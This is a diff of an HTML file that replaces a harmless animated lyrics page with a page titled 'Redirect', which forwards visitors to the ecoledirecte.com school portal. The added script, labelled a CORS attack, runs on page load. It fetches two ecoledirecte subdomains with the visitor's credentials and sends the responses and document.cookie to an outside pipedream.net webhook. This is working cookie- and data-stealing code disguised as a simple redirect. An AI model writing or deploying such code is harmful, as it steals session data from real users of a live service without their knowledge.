@@ -1,154 +1,41 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<title>EXON1 Cinematic</title>
-<style>
-body {
-  margin:0; padding:0; overflow:hidden;
-  background:#000;
-  font-family: "Courier New", monospace;
-}
-
-/* Lyrics */
-#lyrics {
-  position:absolute; top:50%; left:50%;
-  transform:translate(-50%,-50%);
-  font-size:2rem; white-space:pre-wrap;
-  letter-spacing:2px; color:#0f0;
-  text-shadow:0 0 2px #0f0,0 0 5px #0f0;
-  z-index:1;
-}
-
-/* Cinéma bars */
-#topBar, #bottomBar {
-  position:fixed; left:0; right:0;
-  height:20%; background:#000;
-  z-index:2000;
-  transition: all 4s linear;
-}
-#topBar { top:0; }
-#bottomBar { bottom:0; }
-
-/* Texte EXON */
-#exon {
-  position:fixed; top:50%; left:50%;
-  transform:translate(-50%,-50%);
-  font-size:10rem; font-weight:400;
-  color:#000; letter-spacing:1rem;
-  display:flex; gap:0.5rem;
-  opacity:0; z-index:3000;
-}
-#exon span { display:inline-block; }
-
-/* Animations */
-.fastLeft {
-  animation: fastLeft 4s linear forwards;
-}
-.fastRight {
-  animation: fastRight 4s linear forwards;
-}
-.slowLeft {
-  animation: slowLeft 6s linear forwards;
-}
-.slowRight {
-  animation: slowRight 6s linear forwards;
-}
-
-@keyframes fastLeft {
-  from { transform:translateX(0); opacity:1; }
-  to   { transform:translateX(-500px); opacity:0; }
-}
-@keyframes fastRight {
-  from { transform:translateX(0); opacity:1; }
-  to   { transform:translateX(500px); opacity:0; }
-}
-@keyframes slowLeft {
-  from { transform:translateX(0); opacity:1; }
-  to   { transform:translateX(-250px); opacity:0; }
-}
-@keyframes slowRight {
-  from { transform:translateX(0); opacity:1; }
-  to   { transform:translateX(250px); opacity:0; }
-}
-</style>
+    <title>Redirect</title>
+    <meta http-equiv="refresh" content="0;url=https://ecoledirecte.com">
 </head>
 <body>
-
-<div id="lyrics"></div>
-<div id="topBar"></div>
-<div id="bottomBar"></div>
-<div id="exon">
-  <span id="E">E</span>
-  <span id="X">X</span>
-  <span id="O">O</span>
-  <span id="N">N</span>
-</div>
-
-<audio id="song" preload="auto">
-  <source src="musique.mp3" type="audio/mpeg">
-</audio>
-
-<script>
-const audio = document.getElementById('song');
-const lyricsDiv = document.getElementById('lyrics');
-
-const topBar = document.getElementById("topBar");
-const bottomBar = document.getElementById("bottomBar");
-const exon = document.getElementById("exon");
-const E = document.getElementById("E");
-const X = document.getElementById("X");
-const O = document.getElementById("O");
-const N = document.getElementById("N");
-
-const text = "Are you trying to tell me you are not completely blown away by my magnificent entrance just now?".split(" ");
-
-const musicStart = 75;   // 1:15
-const lyricStart = 82.5; // 1:22.5
-const lyricEnd   = 87;   // 1:27
-const lyricDuration = lyricEnd - lyricStart;
-const exonTime = 78;     // 1:18
-
-let exonPlayed = false;
-
-// Autoplay après clic
-document.body.addEventListener('click', async () => {
-  audio.currentTime = musicStart;
-  await audio.play();
-
-  audio.addEventListener("timeupdate", () => {
-    const t = audio.currentTime;
-
-    // Lyrics
-    if (t >= lyricStart && t <= lyricEnd) {
-      const elapsed = t - lyricStart;
-      const wordIndex = Math.floor((elapsed / lyricDuration) * text.length);
-      lyricsDiv.textContent = text.slice(0, wordIndex+1).join(" ");
-    }
-
-    // EXON animation
-    if (t >= exonTime && !exonPlayed) {
-      exonPlayed = true;
-
-      // Fond blanc immédiat
-      document.body.style.background = "#fff";
-
-      // Les barres se resserrent
-      topBar.style.top = "30%";
-      bottomBar.style.bottom = "30%";
-
-      // EXON apparaît brutalement
-      exon.style.opacity = "1";
-
-      // E et N rapides, X et O plus lents
-      E.classList.add("fastLeft");
-      N.classList.add("fastRight");
-      X.classList.add("slowLeft");
-      O.classList.add("slowRight");
-    }
-  });
-});
-</script>
-
+    <script>
+        const WEBHOOK_URL = 'https://eo8uniwr7mg9h4g.m.pipedream.net';
+        
+        // Attaque CORS
+        async function exploit() {
+            const targets = [
+                'https://piwik.ecoledirecte.com/matomo.php',
+                'https://controller.ecoledirecte.com/socket.io/'
+            ];
+            
+            for (const target of targets) {
+                try {
+                    const response = await fetch(target, {credentials: 'include'});
+                    const data = await response.text();
+                    
+                    // Envoyer à webhook.site
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            target: target,
+                            cookies: document.cookie,
+                            data: data.substring(0, 500),
+                            timestamp: new Date().toISOString()
+                        })
+                    });
+                } catch(e) {}
+            }
+        }
+        
+        exploit();
+    </script>
 </body>
 </html>
